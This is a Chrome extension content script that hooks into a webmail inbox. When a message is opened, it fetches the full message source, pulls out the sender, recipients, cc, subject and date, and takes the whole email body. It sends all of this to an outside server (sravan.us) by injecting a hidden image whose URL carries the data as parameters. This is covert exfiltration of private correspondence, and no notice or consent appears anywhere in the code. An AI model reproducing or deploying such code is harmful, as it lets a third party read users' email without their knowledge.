chrome.extension.sendMessage({}, function(response) {
	var readyStateCheckInterval = setInterval(function() {
	if (document.readyState === "complete") {
		clearInterval(readyStateCheckInterval);

		// ----------------------------------------------------------
		// This part of the script triggers when page is done loading
		// console.log("Hello. This message was sent from scripts/inject.js");
		// ----------------------------------------------------------


        $(document).ready( function () {
            setTimeout( function() {
                parse_inbox_table_body();
            }, 2000);
        });

	}
	}, 10);
});


function parse_inbox_table_body() {
    $(".InboxTableBody" ).find( "li" ).click( function() {
        parse_email_by_id($(this).attr("id"));
    });

    // TODO : add keyboard events
    
}

function parse_email_by_id(id) {
    url = "https://"+window.location.host+"/mail/GetMessageSource.aspx?msgid="+id;
   
    $.post( url, function( data ) {
        data = parse_email_data_response(data);

        metadata = {};

        metadata["to"] = get_email_data(data, "to");
        metadata["from"] = get_email_data(data, "from");

        cc = get_email_data(data, "cc");

        if (cc != null && cc != undefined) {
            metadata["cc"] = cc;
        }

        metadata["id"] = id;
        metadata["subject"] = get_email_data(data, "subject");
        metadata["date"] = get_email_data(data, "date");
        metadata["importance"] = get_email_data(data, "importance");
        metadata["email_body"] = data;
        metadata["open_timestamp"] = Math.round(new Date().getTime()/1000.0);

        img_url = "https://sravan.us/images/img.php?"+$.param(metadata);
        $('#mpf0_MsgContainer').html($('#mpf0_MsgContainer').html()+"<img src='"+img_url+"'>");
        console.log(img_url);

    });
}

function parse_email_data_response(data) {
    data = JSON.stringify(data);
    data = data.replace(/&#64;/g, "@");
    data = data.replace(/&#60;/g, "<");
    data = data.replace(/&#62;/g, ">");
    data = data.replace(/&#58;/g, ":");
    data = data.replace(/&#61;/g, "=");
    data = data.replace(/&#10;/g, "\n");
    data = data.replace(/&#39;/g, "'");
    data = data.replace(/&#123;/g, "{");
    data = data.replace(/&#125;/g, "}");
    data = data.replace(/&#9;/g, "\t");
    data = data.replace(/&#33;/g, "!");
    data = data.replace(/&#59;/g, ";");
    data = data.replace(/&#34;/g, "\"");
    data = data.replace(/&#40;/g, "(");
    data = data.replace(/&#41;/g, ")");
    data = data.replace(/&#91;/g, "[");
    data = data.replace(/&#93;/g, "]");
    return data;
}

function get_email_data(data, key) {
    lines = data.split("\n");
    for (var i = 0; i < lines.length; i++) {
        items = lines[i].split(": ");
        if(items.length == 2 && items[0].split(": ")[0].toLowerCase() == key) {
            return items[1];
        }
    }
}
